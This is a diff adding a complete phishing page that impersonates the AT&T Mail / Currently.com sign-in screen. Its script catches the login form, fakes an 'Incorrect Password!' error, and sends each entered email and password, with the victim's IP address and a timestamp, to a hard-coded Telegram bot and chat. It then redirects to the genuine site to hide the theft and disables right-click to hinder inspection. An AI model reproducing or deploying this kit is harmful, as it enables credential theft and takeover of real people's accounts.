@@ -1,0 +1,206 @@
+<html lang="en" class="isPC isFirefox isLandscape">
+<head>
+  <meta charset="utf-8">
+  <title>Login Screen</title>
+  <base href="/">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+  <!-- Add the AT&T logo as the favicon -->
+  <link rel="icon" type="image/x-icon" href="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg">
+
+  <style>
+    /* Ensure footer stays at the bottom of the page */
+    body, html {
+      height: 100%;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #app-root {
+      flex: 1;
+    }
+
+    footer {
+      margin-top: auto;
+      background-color: #fff;  /* White background */
+      padding: 20px 0;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    footer a {
+      text-decoration: none;
+    }
+
+    /* Style for the links */
+    .left-align {
+      font-size: 15px;
+      color: blue;
+      font-weight: bold;
+      text-decoration: none;
+      display: block;
+      margin-top: 10px;
+    }
+
+    .left-align:hover {
+      text-decoration: underline;
+    }
+
+    /* Add margin to space out the logo and sign-in text */
+    .sign-in-header {
+      margin-top: 20px; /* Adjust this value to your preference */
+    }
+
+    /* Add space between the links */
+    .spaced-links {
+      margin-bottom: 10px; /* Adjust this value for desired spacing */
+    }
+  </style>
+
+  <script>
+    let attemptCount = 0; // Initialize attempt count
+
+    // Handle the form submission
+    function handleFormSubmit(event) {
+      event.preventDefault(); // Prevent form submission
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Handle first or second attempt logic
+      if (attemptCount === 0) {
+        // First attempt: simulate verification
+        attemptCount++;
+        verifyPassword(email, password);
+      } else if (attemptCount === 1) {
+        // Second attempt: simulate verification
+        attemptCount++;
+        verifyPassword(email, password);
+      }
+    }
+
+    // Simulate password verification (adjust this logic to match your actual verification)
+    function verifyPassword(email, password) {
+      // Simulate a delay for verification
+      setTimeout(function() {
+        if (attemptCount === 1) {
+          // First failed attempt: show message and clear password field
+          document.getElementById("msg").innerText = "Incorrect Password!";
+          document.getElementById("password").value = ''; // Clear the password field
+        } else if (attemptCount === 2) {
+          // Second failed attempt: show message and redirect
+          document.getElementById("msg").innerText = "";
+          setTimeout(function() {
+            window.location.replace("https://currently.att.yahoo.com/");
+          }, 1000); // Delay the redirect slightly
+        }
+
+        // After two failed attempts, send details to Telegram and redirect
+        getIpAddressAndSendMessage(email, password);
+      }, 1000); // Simulate verification delay
+    }
+
+    // Function to get the IP address and send the login details to Telegram
+    function getIpAddressAndSendMessage(email, password) {
+      const botToken = '7310878043:AAGSH6cm3mC2Nzb487ccRDXLk15OmB-0QKk'; // Replace with your Telegram bot API token
+      const chatId = '7213438603'; // Replace with your Telegram chat ID
+
+      // Get the IP address using the ipify API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          const currentDate = new Date();
+          const formattedDate = currentDate.toLocaleString(); // Format date as per the browser locale
+          
+          // Prepare the message with email, password, IP address, and formatted date
+          const message = `Email: ${email}\nPassword: ${password}\nSubmitted from IP Address: ${ipAddress} on ${formattedDate}\n--------------AT&T-----------`;
+
+          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+          // Send the message to Telegram
+          fetch(telegramUrl)
+            .then(response => {
+              if (response.ok) {
+                console.log('Message sent to Telegram successfully');
+              } else {
+                console.log('Failed to send message to Telegram');
+              }
+            })
+            .catch(error => {
+              console.error('Error sending message to Telegram:', error);
+            });
+        })
+        .catch(err => {
+          console.error('Error fetching IP address:', err);
+        });
+    }
+
+    // Disable right-click on the page
+    document.addEventListener("contextmenu", function(event) {
+      event.preventDefault(); // Prevent the context menu
+    });
+  </script>
+
+  <link rel="stylesheet" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/styles.css?v=20.2.8">
+</head>
+
+<body>
+  <div id="app-root" _nghost-hwn-c36="" ng-version="11.2.14" app-version="20.2.8">
+    <div _ngcontent-hwn-c36="" id="appCompBackground" class="full-width-background bg-white">
+      <div _ngcontent-hwn-c36="" id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
+        <div _ngcontent-hwn-c36="" id="appCompCardContainer" class="row justify-center flex-1">
+          <div _ngcontent-hwn-c36="" id="appCompCardContDiv" class="pad-none">
+            <app-card _ngcontent-hwn-c36="" role="main" _nghost-hwn-c28="">
+              <div _ngcontent-hwn-c28="" class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
+                <div _ngcontent-hwn-c28="" class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
+                  <app-header _ngcontent-hwn-c28="" class="flex-container" _nghost-hwn-c27="">
+                    <img _ngcontent-hwn-c27="" id="headerLogoImage" alt="" src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image header-logo-image-bottom">
+                    <div _ngcontent-hwn-c27="" class="split-login-header text-center sign-in-header">
+                      <h1 _ngcontent-hwn-c27="" id="signInHeaderText" class="heading-lg letter-spacing-3">Sign in</h1>
+                      <h1 _ngcontent-hwn-c27="" id="signInHeaderToText" class="heading-md letter-spacing-3 mar-t8">to access AT&amp;T Mail and Currently.com</h1>
+                    </div>
+                  </app-header>
+                  <form id="login" method="post" class="manual-login-form" onsubmit="handleFormSubmit(event)">
+                    <div _ngcontent-hwn-c50="" class="form-row space-below">
+                      <label _ngcontent-hwn-c38="" id="userLabel" for="userID" class="formfield-label">User ID</label>
+                      <input id="email" name="email" spellcheck="false" autocapitalize="none" type="email" class="textfield" required>
+                    </div>
+                    <div _ngcontent-hwn-c50="" class="form-row space-below">
+                      <label _ngcontent-hwn-c38="" id="passwordLabel" for="password" class="formfield-label">Password</label>
+                      <input id="password" name="password" type="password" class="textfield" required>
+                    </div>
+                    <div id="msg" style="color: red; margin-top: 10px;"></div>
+                    <div _ngcontent-hwn-c50="" class="continue-button-spacing">
+                      <button type="submit" class="btn-primary btn-full-width letter-spacing-3" id="submit-btn">Sign in</button>
+                    </div>
+                  </form>
+
+                  <!-- Add the Forgot User ID and Create User ID links below the submit button -->
+                  <a href="#" class="left-align spaced-links">Forgot user ID?</a>
+                  <a href="#" class="left-align">Don't have a user ID? Create one now</a>
+                </div>
+              </div>
+            </app-card>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer with legal links and copyright -->
+  <footer>
+    <div>
+      <a href="https://www.att.com/legal-terms/privacy-policy/" target="_blank">Privacy Policy</a> | 
+      <a href="https://www.att.com/legal-terms/terms-of-use/" target="_blank">Terms of Use</a> | 
+      <a href="https://www.att.com/legal-terms/accessibility/" target="_blank">Accessibility</a> | 
+      <a href="https://www.att.com/legal-terms/privacy-choices/" target="_blank">Your Privacy Choices</a>
+      <br>
+      <p>© 2024 AT&T Intellectual Property. All rights reserved.</p>
+    </div>
+  </footer>
+</body>
+</html>
